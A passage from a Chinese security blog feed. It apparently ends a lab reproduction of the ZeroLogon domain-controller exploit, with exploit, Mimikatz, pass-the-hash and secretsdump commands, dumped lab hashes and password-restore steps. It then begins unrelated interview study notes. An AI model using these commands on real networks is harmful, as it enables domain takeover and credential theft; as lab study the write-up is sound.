192.168.93.30</span><br></pre></td></tr></table></figure><p><img src="/images/zeroLogon%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230810113855368.png" alt="image-20230810113855368" /></p><p>工具 <a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python cve-2020-1472-exploit.py DC 192.168.93.30</span><br></pre></td></tr></table></figure><h3 id="mimikatz-2"><a class="markdownIt-Anchor" href="#mimikatz-2"></a> Mimikatz</h3><pre><code>lsadump::zerologon /target:192.168.93.30 /account:DC$ /exploitexit</code></pre><h3 id="后果"><a class="markdownIt-Anchor" href="#后果"></a> 后果：</h3><p>注意此时：<code>DC$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code>后半段为空值的哈希，即：<code>31d6cfe0d16ae931b73c59d7e0c089c0</code></p><h2 id="导出获取域内凭证从ntdsdit中获取"><a class="markdownIt-Anchor" href="#导出获取域内凭证从ntdsdit中获取"></a> 导出/获取域内凭证（从ntds.dit中获取）</h2><p>获取了其他域成员的凭证，包括aes的，到时候就可以直接登录了。</p><h3 id="脚本impacket-2"><a class="markdownIt-Anchor" href="#脚本impacket-2"></a> 脚本（impacket）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python secretsdump.py whoamianony.org/&#x27;DC$&#x27;@192.168.93.30 -just-dc -no-pass</span><br></pre></td></tr></table></figure><p><img src="/images/zeroLogon%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230810115416533.png" alt="image-20230810115416533" /></p><h3 id="mimikatz-3"><a class="markdownIt-Anchor" href="#mimikatz-3"></a> Mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:dc.whoamianony.org /dc:DC /user:administrator /authuser:DC$ /authdomain:main /authpassword:&quot;&quot; /authntlm</span><br></pre></td></tr></table></figure><h2 id="恢复域控hash"><a class="markdownIt-Anchor" href="#恢复域控hash"></a> 恢复域控HASH</h2><blockquote><p>Mimikatz恢复域控HASH是将NTDS.DIT中的凭证以及注册表/lsass中的凭证同时修改为 (<code>Waza1234/Waza1234/Waza1234</code>)，并非是原本值，虽然不影响域运行，但是还是留下了痕迹。</p></blockquote><p>推荐方法是恢复成原始的HASH，首先要获取注册表信息中域控原始HASH，<a href="http://xn--Impacketwmiexec-sz3xe3g74vx3doxfcu5tbjg.py">可以利用Impacket包中的wmiexec.py</a>、psexec.py工具获取，以wmiexec.py为例，命令中进行了HASH传递，凭证是刚刚获取的域管HASH。</p><h3 id="获取原始域管hash从注册表中获取"><a class="markdownIt-Anchor" href="#获取原始域管hash从注册表中获取"></a> 获取原始域管HASH（从注册表中获取）</h3><h4 id="imapcket-wmiexec-dump下来再恢复"><a class="markdownIt-Anchor" href="#imapcket-wmiexec-dump下来再恢复"></a> imapcket-wmiexec dump下来再恢复</h4><p>通过impacket进行横向（<a href="http://wimexec.py">wimexec.py</a>），抓取注册表中的哈希：</p><blockquote><p>之前抓取到哈希：Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::</p><p>用这个登录就可以了。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">proxychains python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec whoamianony.org/administrator@192.168.93.30</span><br><span class="line"></span><br><span class="line"># 命令行操作，然后分别执行,拷贝本机中SAM数据库到本地</span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">lget system.save</span><br><span class="line">lget sam.save</span><br><span class="line">lget security.save</span><br><span class="line">del /f system.save</span><br><span class="line">del /f sam.save</span><br><span class="line">del /f security.save</span><br><span class="line"></span><br><span class="line">proxychains python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure><p>运行完成后，可以获取以前的域管哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[*] Target system bootKey: 0xa162a169cd23eb6b6f49b5f39468323e</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">$MACHINE.ACC:plain_password_hex:79776bc8a5da93290cb55745ce271daa1c5279db593873b0f392dc84590d9129ad105e29e5ee083e353048501dc810abf5ba60e7e78020473391d165fe48f9798b8df5e16e3340f3b3f4a89d98a6cd2bc77506ae09491afdfc0a39213de0afd2d857b861cd6c537a0463cbaa28820f9f3beabb77859a924afa273b47587a1795e90b3664f6441493a4bdc12abf6e3dfaa2da3ea9f9bca651916eb72a8c6d731639baa05f5725236ea8b9b8f80b3e04ccf1f0632741f16cbc462b82061d58295f77afaf65e4f3e26143cfb0ee4a2b6cfe9fb23421b9c798c4d0a79e58a1389c9dd37e3ea340817e50c227fe589088a8d0</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c0566fa26234cd211c856fabc1f67660</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x0b196b8145294227c3d9d31ca1c98f26eb76df55</span><br><span class="line">dpapi_userkey:0x005583a60875a7e29f120651014ad5555afba537</span><br><span class="line">[*] NL$KM </span><br><span class="line"> 0000   1E D4 61 DB FC 9A 35 23  11 05 E0 EB 74 B4 F1 D1   ..a...5#....t...</span><br><span class="line"> 0010   D0 94 D7 F6 DD E2 59 C9  77 F9 24 9A 95 42 83 D9   ......Y.w.$..B..</span><br><span class="line"> 0020   BF 0D 68 2A FB F5 B5 D8  58 35 83 68 DD D9 15 CF   ..h*....X5.h....</span><br><span class="line"> 0030   68 CA 5E BC 73 0E 3F EA  B1 3E F9 0C 3C 53 E5 57   h.^.s.?..&gt;..&lt;S.W</span><br><span class="line">NL$KM:1ed461dbfc9a35231105e0eb74b4f1d1d094d7f6dde259c977f9249a954283d9bf0d682afbf5b5d858358368ddd915cf68ca5ebc730e3feab13ef90c3c53e557</span><br></pre></td></tr></table></figure><p>即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$MACHINE.ACC:plain_password_hex:79776bc8a5da93290cb55745ce271daa1c5279db593873b0f392dc84590d9129ad105e29e5ee083e353048501dc810abf5ba60e7e78020473391d165fe48f9798b8df5e16e3340f3b3f4a89d98a6cd2bc77506ae09491afdfc0a39213de0afd2d857b861cd6c537a0463cbaa28820f9f3beabb77859a924afa273b47587a1795e90b3664f6441493a4bdc12abf6e3dfaa2da3ea9f9bca651916eb72a8c6d731639baa05f5725236ea8b9b8f80b3e04ccf1f0632741f16cbc462b82061d58295f77afaf65e4f3e26143cfb0ee4a2b6cfe9fb23421b9c798c4d0a79e58a1389c9dd37e3ea340817e50c227fe589088a8d0</span><br></pre></td></tr></table></figure><h4 id="impacket-secretsdump"><a class="markdownIt-Anchor" href="#impacket-secretsdump"></a> impacket-secretsdump</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec whoamianony.org/administrator@192.168.93.30</span><br></pre></td></tr></table></figure><h3 id="恢复"><a class="markdownIt-Anchor" href="#恢复"></a> 恢复</h3><p>使用脚本 <a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python reinstall_original_pw.py DC 192.168.93.30 79776bc8a5da93290cb55745ce271daa1c5279db593873b0f392dc84590d9129ad105e29e5ee083e353048501dc810abf5ba60e7e78020473391d165fe48f9798b8df5e16e3340f3b3f4a89d98a6cd2bc77506ae09491afdfc0a39213de0afd2d857b861cd6c537a0463cbaa28820f9f3beabb77859a924afa273b47587a1795e90b3664f6441493a4bdc12abf6e3dfaa2da3ea9f9bca651916eb72a8c6d731639baa05f5725236ea8b9b8f80b3e04ccf1f0632741f16cbc462b82061d58295f77afaf65e4f3e26143cfb0ee4a2b6cfe9fb23421b9c798c4d0a79e58a1389c9dd37e3ea340817e50c227fe589088a8d0</span><br></pre></td></tr></table></figure><p><img src="/images/zeroLogon%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230810130201655.png" alt="image-20230810130201655" /></p><h1 id="备注"><a class="markdownIt-Anchor" href="#备注"></a> 备注</h1><p><img src="/images/zeroLogon%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230810130120564.png" alt="image-20230810130120564" /></p><h2 id="置空哈希后的哈希值"><a class="markdownIt-Anchor" href="#置空哈希后的哈希值"></a> 置空哈希后的哈希值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6be58bfcc0a164af2408d1d3bd313c2a:::</span><br><span class="line">whoami:1001:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::</span><br><span class="line">whoamianony.org\bunny:1112:aad3b435b51404eeaad3b435b51404ee:cc567d5556030b7356ee4915ff098c8f:::</span><br><span class="line">whoamianony.org\moretz:1115:aad3b435b51404eeaad3b435b51404ee:ba6723567ac2ca8993b098224ac27d90:::</span><br><span class="line">DC$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">PC2$:1113:aad3b435b51404eeaad3b435b51404ee:803959d82b51f5761137db87ef1aa382:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:77dd8d0b0d436b6df02303f0a5a98d95acda6f84144ea53525bfee5ffda45afb</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:aaeee8cffc1ade3061ce78b89237a7b8</span><br><span class="line">krbtgt:des-cbc-md5:9b3446f829dfbf3e</span><br><span class="line">whoamianony.org\bunny:aes256-cts-hmac-sha1-96:62694713f45b34ebcd0dd2ad5a66ebb20a7245e839b5a2a149d2ab367a703120</span><br><span class="line">whoamianony.org\bunny:aes128-cts-hmac-sha1-96:63064306d5306e43c7c56c7d7ac44d57</span><br><span class="line">whoamianony.org\bunny:des-cbc-md5:8fd6bc2980d5523b</span><br><span class="line">whoamianony.org\moretz:aes256-cts-hmac-sha1-96:854ae083f158747bf98a27b4f32bccfe369c8e3d04c5eb12b14c0e25117dc2cf</span><br><span class="line">whoamianony.org\moretz:aes128-cts-hmac-sha1-96:6630108d408ba8ee70eda87474753a21</span><br><span class="line">whoamianony.org\moretz:des-cbc-md5:4ca849cbda4089c7</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:158b91d51f464d4925203f858df685b6902071fa99d8548db9d949a396953a68</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:23cdac24d614d6dabbd7a3c66e4e2477</span><br><span class="line">DC$:des-cbc-md5:92da0d348a19a73b</span><br><span class="line">PC2$:aes256-cts-hmac-sha1-96:a5c8ebe823bdf20cf8a397d3ab55df29b09a00d47161589a6b79f9e96ba5b574</span><br><span class="line">PC2$:aes128-cts-hmac-sha1-96:61f532c770da24540b9143f6313698d7</span><br><span class="line">PC2$:des-cbc-md5:865883688fc80ef4</span><br></pre></td></tr></table></figure><p>注意此时：<code>DC$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code>后半段为空值的哈希。</p><h2 id="恢复哈希后的哈希值"><a class="markdownIt-Anchor" href="#恢复哈希后的哈希值"></a> 恢复哈希后的哈希值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[*] Target system bootKey: 0xa162a169cd23eb6b6f49b5f39468323e</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">WHOAMIANONY\DC$:aes256-cts-hmac-sha1-96:35c1d23d24c1c0e8062fe7afe13326fb15592452832a9c88238e67ea7bd37017</span><br><span class="line">WHOAMIANONY\DC$:aes128-cts-hmac-sha1-96:9f039b96a64edc02e926634489bc9871</span><br><span class="line">WHOAMIANONY\DC$:des-cbc-md5:b9791f5de6ec985b</span><br><span class="line">WHOAMIANONY\DC$:plain_password_hex:79776bc8a5da93290cb55745ce271daa1c5279db593873b0f392dc84590d9129ad105e29e5ee083e353048501dc810abf5ba60e7e78020473391d165fe48f9798b8df5e16e3340f3b3f4a89d98a6cd2bc77506ae09491afdfc0a39213de0afd2d857b861cd6c537a0463cbaa28820f9f3beabb77859a924afa273b47587a1795e90b3664f6441493a4bdc12abf6e3dfaa2da3ea9f9bca651916eb72a8c6d731639baa05f5725236ea8b9b8f80b3e04ccf1f0632741f16cbc462b82061d58295f77afaf65e4f3e26143cfb0ee4a2b6cfe9fb23421b9c798c4d0a79e58a1389c9dd37e3ea340817e50c227fe589088a8d0</span><br><span class="line">WHOAMIANONY\DC$:aad3b435b51404eeaad3b435b51404ee:c0566fa26234cd211c856fabc1f67660:::</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x0b196b8145294227c3d9d31ca1c98f26eb76df55</span><br><span class="line">dpapi_userkey:0x005583a60875a7e29f120651014ad5555afba537</span><br><span class="line">[*] NL$KM </span><br><span class="line"> 0000   1E D4 61 DB FC 9A 35 23  11 05 E0 EB 74 B4 F1 D1   ..a...5#....t...</span><br><span class="line"> 0010   D0 94 D7 F6 DD E2 59 C9  77 F9 24 9A 95 42 83 D9   ......Y.w.$..B..</span><br><span class="line"> 0020   BF 0D 68 2A FB F5 B5 D8  58 35 83 68 DD D9 15 CF   ..h*....X5.h....</span><br><span class="line"> 0030   68 CA 5E BC 73 0E 3F EA  B1 3E F9 0C 3C 53 E5 57   h.^.s.?..&gt;..&lt;S.W</span><br><span class="line">NL$KM:1ed461dbfc9a35231105e0eb74b4f1d1d094d7f6dde259c977f9249a954283d9bf0d682afbf5b5d858358368ddd915cf68ca5ebc730e3feab13ef90c3c53e557</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6be58bfcc0a164af2408d1d3bd313c2a:::</span><br><span class="line">whoami:1001:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::</span><br><span class="line">whoamianony.org\bunny:1112:aad3b435b51404eeaad3b435b51404ee:cc567d5556030b7356ee4915ff098c8f:::</span><br><span class="line">whoamianony.org\moretz:1115:aad3b435b51404eeaad3b435b51404ee:ba6723567ac2ca8993b098224ac27d90:::</span><br><span class="line">DC$:1002:aad3b435b51404eeaad3b435b51404ee:79776bc8a5da93290cb55745ce271daa:::</span><br><span class="line">PC2$:1113:aad3b435b51404eeaad3b435b51404ee:803959d82b51f5761137db87ef1aa382:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:77dd8d0b0d436b6df02303f0a5a98d95acda6f84144ea53525bfee5ffda45afb</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:aaeee8cffc1ade3061ce78b89237a7b8</span><br><span class="line">krbtgt:des-cbc-md5:9b3446f829dfbf3e</span><br><span class="line">whoamianony.org\bunny:aes256-cts-hmac-sha1-96:62694713f45b34ebcd0dd2ad5a66ebb20a7245e839b5a2a149d2ab367a703120</span><br><span class="line">whoamianony.org\bunny:aes128-cts-hmac-sha1-96:63064306d5306e43c7c56c7d7ac44d57</span><br><span class="line">whoamianony.org\bunny:des-cbc-md5:8fd6bc2980d5523b</span><br><span class="line">whoamianony.org\moretz:aes256-cts-hmac-sha1-96:854ae083f158747bf98a27b4f32bccfe369c8e3d04c5eb12b14c0e25117dc2cf</span><br><span class="line">whoamianony.org\moretz:aes128-cts-hmac-sha1-96:6630108d408ba8ee70eda87474753a21</span><br><span class="line">whoamianony.org\moretz:des-cbc-md5:4ca849cbda4089c7</span><br><span class="line">PC2$:aes256-cts-hmac-sha1-96:a5c8ebe823bdf20cf8a397d3ab55df29b09a00d47161589a6b79f9e96ba5b574</span><br><span class="line">PC2$:aes128-cts-hmac-sha1-96:61f532c770da24540b9143f6313698d7</span><br><span class="line">PC2$:des-cbc-md5:865883688fc80ef4</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>已经变回<code>79776bc8a5da93290cb55745ce271daa</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;zerologon-cve-2020-1472简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#zerologon-cve-2020-1472简介&quot;&gt;&lt;/a&gt; ZeroLogon (CVE-2020-1472)简介&lt;/h1&gt;
&lt;p&gt;N</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>面试整理</title>
    <link href="https://j3f5.github.io/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/"/>
    <id>https://j3f5.github.io/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/</id>
    <published>2023-08-10T01:27:17.000Z</published>
    <updated>2023-08-20T01:27:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="数据结构与算法"><a class="markdownIt-Anchor" href="#数据结构与算法"></a> 数据结构与算法</h2><h3 id="树的遍历"><a class="markdownIt-Anchor" href="#树的遍历"></a> 树的遍历</h3><p>树的一些概念：</p><ul><li><p>度：节点的度就是孩子的个数，树的度就是最大的度</p></li><li><p>深度（自上往下）、高度（自下往上）、层次（根节点为第一层，自上往下）</p></li><li><p>有序（左右孩子不可互换）、无序（可互换）</p></li><li><p>满二叉树（最后一排也是满的），平衡二叉树（任意节点的高度不超过1），完全二叉树（必须有左孩子才能有右孩子）</p></li><li><p>一些公式：</p><ul><li>总结点数 = 所有节点度的和 + 1</li><li>总结点数 = 总分支数 + 1</li><li>边 = 度 = 分支数</li><li>度为m的树中第i层至多有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">m^{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.824664em;"></span><span class="strut bottom" style="height:0.824664em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathit">m</span><span class="vlist"><span style="top:-0.363em;margin-right:0.05em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord scriptstyle uncramped"><span class="mord mathit">i</span><span class="mbin">−</span><span class="mord mathrm">1</span></span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span></span></span></span>个节点</li></ul></li><li><p>遍历：</p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230913102846918.png" alt="image-20230913102846918" style="zoom: 50%;" /><ul><li>先序（ABDEC）都可以使用递归算法（栈）</li><li>中序（DBEAC）</li><li>后序（DEBCA）</li><li>层次（ABCDE）使用队列</li></ul></li></ul><ul><li>哈夫曼树：用于压缩数据，带权路径为：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>P</mi><mi>L</mi><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi></mrow></msubsup><msub><mi>w</mi><mi>i</mi></msub><msub><mi>l</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">WPL=\sum_{i=1}^{n}w_il_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1.0500099999999999em;vertical-align:-0.30001em;"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:0.13889em;">W</span><span class="mord mathit" style="margin-right:0.13889em;">P</span><span class="mord mathit">L</span><span class="mrel">=</span><span class="mop"><span class="op-symbol small-op mop" style="top:-0.0000050000000000050004em;">∑</span><span class="vlist"><span style="top:0.30001em;margin-left:0em;margin-right:0.05em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle cramped"><span class="mord scriptstyle cramped"><span class="mord mathit">i</span><span class="mrel">=</span><span class="mord mathrm">1</span></span></span></span><span style="top:-0.364em;margin-right:0.05em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord scriptstyle uncramped"><span class="mord mathit">n</span></span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span><span class="mord"><span class="mord mathit" style="margin-right:0.02691em;">w</span><span class="vlist"><span style="top:0.15em;margin-right:0.05em;margin-left:-0.02691em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle cramped"><span class="mord mathit">i</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span><span class="mord"><span class="mord mathit" style="margin-right:0.01968em;">l</span><span class="vlist"><span style="top:0.15em;margin-right:0.05em;margin-left:-0.01968em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle cramped"><span class="mord mathit">i</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span></span></span></span>。</li></ul><h3 id="排序"><a class="markdownIt-Anchor" href="#排序"></a> 排序</h3><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230913104657807.png" alt="image-20230913104657807" /></p><h2 id="操作系统"><a class="markdownIt-Anchor" href="#操作系统"></a> 操作系统</h2><h3 id="虚拟内存是什么"><a class="markdownIt-Anchor" href="#虚拟内存是什么"></a> 虚拟内存是什么？</h3><p>虚拟内存是计算机系统内存管理的一种技术。它使得应用程序认为它拥有连续的可用的内存（一个连续完整的地址空间），而实际上，它通常是被分隔成多个物理内存碎片，还有部分暂时存储在外部磁盘存储器上，在需要时进行数据交换。虚拟内存可以让程序可以拥有超过系统物理内存大小的可用内存空间。</p><p>**虚拟内存的工作原理是，当计算机的物理内存不足时，操作系统会将硬盘的一部分空间临时用作内存，**以扩展可用内存空间。这样做可以更有效地管理内存并减少出错。</p><h3 id="大端序和小端序的区别现在x64程序都是大端序还是小端序x86呢"><a class="markdownIt-Anchor" href="#大端序和小端序的区别现在x64程序都是大端序还是小端序x86呢"></a> 大端序和小端序的区别？现在X64程序都是大端序还是小端序，X86呢？</h3><p>大端序是指：高位字节存入低位置</p><p>小端序是指：低位字节存入低位置</p><p>一般都是用小端序。</p><h3 id="new出来的变量放在堆还是栈如果new出来没有free会有什么危险"><a class="markdownIt-Anchor" href="#new出来的变量放在堆还是栈如果new出来没有free会有什么危险"></a> new出来的变量放在堆还是栈？如果new出来没有free，会有什么危险？</h3><p>堆一般是存：存动态内存分配的，如果new了之后，没有free，会造成内存泄露</p><p>栈一般是存：静态/常规变量，局部变量，函数地址等</p><p>而如果有内存泄露，那么程序会一直占用该内存空间，最后导致系统因为内存不够而崩溃</p><h2 id="网络"><a class="markdownIt-Anchor" href="#网络"></a> 网络</h2><h3 id="子网掩码"><a class="markdownIt-Anchor" href="#子网掩码"></a> 子网掩码</h3><p>网络号+【子网号+主机号】</p><ul><li><p>二级IP子网掩码：网络号有多少位他就有多少位，且由连续的1和连续的0组成。例如145.13.3.10是B类，则子网掩码就为255.255.0.0</p></li><li><p>三级IP子网掩码：网络号+子网号有多少位他就有多少位例如145.13.3.10（B类），取子网掩码为255.255.255.0，则“3”则为子网号</p></li></ul><h3 id="常见的内网段有哪些他们的掩码是什么"><a class="markdownIt-Anchor" href="#常见的内网段有哪些他们的掩码是什么"></a> 常见的内网段有哪些，他们的掩码是什么</h3><ol><li><code>10.0.0.0/8 10.255.255.255/8</code></li><li><code>172.16.0.0/12 172.31.255.255/12</code></li><li><code>192.168.0.0/16 192.168.255.255/16</code></li></ol><h3 id="各个协议层osi-tcpip"><a class="markdownIt-Anchor" href="#各个协议层osi-tcpip"></a> 各个协议层OSI TCP/IP</h3><table><thead><tr><th>OSI 七层</th><th>TCP IP 五层</th><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td><strong>HTTP</strong> FTP</td><td>请求（为程序或用户提供请求服务）</td></tr><tr><td>表示层</td><td>-</td><td>LPP</td><td>编码（负责编码、加密）</td></tr><tr><td>会话层</td><td>-</td><td>SSL TLS LDAP</td><td>会话（建立会话管理）</td></tr><tr><td>传输层</td><td>传输层</td><td><strong>TCP UDP</strong></td><td>通信（建立端到端连接）</td></tr><tr><td>网络层</td><td>网络层</td><td>IP ICMP</td><td>路由（IP地址和路由选择）</td></tr><tr><td>数据链路层</td><td>数据链路层</td><td>以太网 交换机 ARP</td><td>封帧（提供访问介质和链路管理，MAC封装于此）</td></tr><tr><td>物理层</td><td>物理层</td><td>光纤 集线器</td><td>比特（连接物理媒体，实现比特流传输）</td></tr></tbody></table><h3 id="tcp三次握手-四次挥手"><a class="markdownIt-Anchor" href="#tcp三次握手-四次挥手"></a> 